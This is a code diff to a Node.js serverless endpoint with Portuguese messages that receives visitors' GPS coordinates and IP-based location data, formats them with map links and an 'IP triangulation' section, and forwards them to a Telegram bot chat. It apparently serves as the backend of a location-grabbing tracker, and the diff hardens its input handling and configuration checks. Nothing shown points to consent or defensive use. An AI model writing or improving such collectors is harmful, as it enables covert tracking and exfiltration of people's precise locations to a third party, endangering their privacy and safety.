@@ -3,14 +3,23 @@ const axios = require('axios')
 module.exports = async (req, res) => {
     // Full CORS enablement
     res.setHeader('Access-Control-Allow-Origin', '*')
-    res.setHeader('Access-Control-Allow-Methods', '*')
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
     res.setHeader('Access-Control-Allow-Headers', '*')
     
-    if (req.method === 'OPTIONS') return res.status(200).end();
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end()
+    }
 
     try {
-        let data = req.method === 'POST' ? req.body : JSON.parse(decodeURIComponent(req.query.data));
-        
+        let data = {}
+        if (req.method === 'POST') {
+            data = req.body || {}
+        } else if (req.method === 'GET' && req.query.data) {
+            data = JSON.parse(decodeURIComponent(req.query.data))
+        } else {
+            return res.status(400).json({ error: 'Método não suportado ou dados faltando' })
+        }
+
         console.log('📩 Received:', JSON.stringify(data, null, 2))
 
         // Build Telegram message
@@ -31,7 +40,7 @@ module.exports = async (req, res) => {
             message += `• 🍎 [Apple Maps](http://maps.apple.com/?ll=${data.geolocation.latitude},${data.geolocation.longitude})\n`
         }
 
-        // IP triangulation from multiple sources
+        // IP triangulation
         if (data.ipLocation) {
             message += `\n🌍 *IP TRIANGULATION:*\n`
             message += `• IP: ${data.ipLocation.ip || data.ipLocation.query}\n`
@@ -50,6 +59,10 @@ module.exports = async (req, res) => {
         const token = process.env.TELEGRAM_BOT_TOKEN
         const chatId = process.env.TELEGRAM_CHAT_ID
         
+        if (!token || !chatId) {
+            throw new Error('Variáveis de ambiente do Telegram não configuradas')
+        }
+
         await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
             chat_id: chatId,
             text: message,
